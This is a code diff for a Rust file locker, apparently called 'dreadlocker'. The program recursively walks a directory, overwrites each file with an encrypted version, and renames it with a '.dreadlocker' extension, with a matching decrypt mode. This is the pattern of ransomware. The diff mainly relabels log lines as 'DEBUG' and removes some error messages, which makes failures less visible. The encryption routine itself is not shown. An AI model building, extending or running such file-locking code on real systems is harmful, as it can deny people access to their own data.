@@ -10,7 +10,7 @@ use crate::settings::Config;
 pub fn iterate_dir(config: &mut Config) {
     let file_list = fs::read_dir(config.get_directory()).unwrap_or_else(|err| {
         eprintln!(
-            "Error reading {}'s content: {}",
+            "Error reading {}'s content: {}. Exiting...",
             config.get_directory(),
             err
         );
@@ -22,15 +22,15 @@ pub fn iterate_dir(config: &mut Config) {
             match metadata.is_file() {
                 true => {
                     if config.decrypt() {
-                        println!("Decrypting '{}'", path.display());
+                        println!("DEBUG: Decrypting '{}'", path.display());
                         decrypt_file(file.unwrap().path(), &config);
                     } else {
-                        println!("Encrypting '{}'", path.display());
+                        println!("DEBUG: Encrypting '{}'", path.display());
                         encrypt_file(file.unwrap().path(), &config);
                     }
                 }
                 false => {
-                    println!("'{}' is a folder, continuing...", path.display());
+                    println!("DEBUG: '{}' is a folder, continuing...", path.display());
                     config.edit_dir(path.into_os_string().into_string().unwrap());
                     iterate_dir(config);
                 }
@@ -48,7 +48,7 @@ fn add_extension(file_path: &PathBuf) {
     let mut new_name: String = String::from(name);
     new_name.push_str(".dreadlocker");
     fs::rename(name, new_name).unwrap_or_else(|err| {
-        eprintln!("Error appending the extension to {}: {}", name, err);
+        eprintln!("DEBUG: Error appending the extension to {}: {}", name, err);
     });
 }
 
@@ -62,11 +62,11 @@ fn del_extension(file_path: &PathBuf) -> Option<u8> {
     if let Some(_) = res {
         new_name = name.replace(".dreadlocker", "");
     } else {
-        println!("file lacking the appropriate extension");
+        println!("DEBUG: file lacking the appropriate extension");
         return None;
     }
     fs::rename(name, new_name).unwrap_or_else(|err| {
-        eprintln!("Error deleting the extension to {}: {}", name, err);
+        eprintln!("DEBUG: Error deleting the extension to {}: {}", name, err);
     });
     Some(0)
 }
@@ -81,22 +81,16 @@ pub fn encrypt_file(file_path: PathBuf, config: &Config) {
         .create(true)
         .open(file_path.clone())
         .unwrap_or_else(|err| {
-            eprintln!("Error opening {} : {}", file_path.display(), err);
             process::exit(1);
         });
     let mut contents = String::new();
     let reading_done = file.read_to_string(&mut contents);
     if reading_done.is_err() {
-        eprintln!(
-            "Error reading {} : {}",
-            file_path.as_path().as_os_str().to_str().unwrap(),
-            reading_done.unwrap()
-        );
     } else {
         match config.get_enc_type() {
             1 => {
                 // TODO: other encryption type
-                println!("Type 1 encryption is not yet implemented. Exiting...");
+                println!("DEBUG: Type 1 encryption is not yet implemented. Exiting...");
                 process::exit(0);
             }
             _ => {
@@ -112,7 +106,7 @@ pub fn encrypt_file(file_path: PathBuf, config: &Config) {
                 file.seek(SeekFrom::Start(0)).unwrap();
                 file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                     eprintln!(
-                        "Error overwriting {}: {}. Sufficient permissions?",
+                        "DEBUG: Error overwriting {}: {}. Sufficient permissions?",
                         &file_path.display(),
                         err
                     );
